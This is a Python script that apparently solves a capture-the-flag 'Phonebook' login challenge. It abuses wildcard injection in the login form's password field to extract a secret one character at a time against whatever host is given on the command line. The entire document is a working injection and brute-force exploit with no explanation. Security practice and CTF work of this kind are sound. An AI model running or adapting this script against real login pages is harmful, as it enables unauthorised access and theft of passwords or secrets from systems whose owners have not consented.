from itertools import count
from unittest import result
import requests
import string
import argparse
import os

parser = argparse.ArgumentParser()
parser.add_argument('--host', type=str, required=True)
args = parser.parse_args()
chars = list(string.printable)
chars.remove('*')

def validate_host():
    r = requests.get(f'http://{args.host}/login')
    if r.text.find('Phonebook - Login') == -1:
        print(f'\tThe HOST {args.host} is not valid')
        exit(1)

def extract(initial, before):
    data = {'username': '*', 'password': initial + before + '*'}
    r = requests.post(f'http://{args.host}/login', data=data)
    return r.text

def main():
    validate_host()
    flag_name = ''
    count = 0
    os.system('clear')
    print('\tSearching for a FLAG, it will magically appear at the end.')
    while True:
        for printable in chars:
            count += 1
            result = extract(flag_name, printable)
            if 'success(data)' in result:
                count = 0
                flag_name = flag_name + printable
                break
            print(f'\tPartial FLAG: ({flag_name}) ‚è≥ Testing character: {printable}', end='\r')
            
        if count == 99: 
            os.system('clear')
            print(f'\tüèÅ The FLAG is {flag_name}')
            exit(0)

main()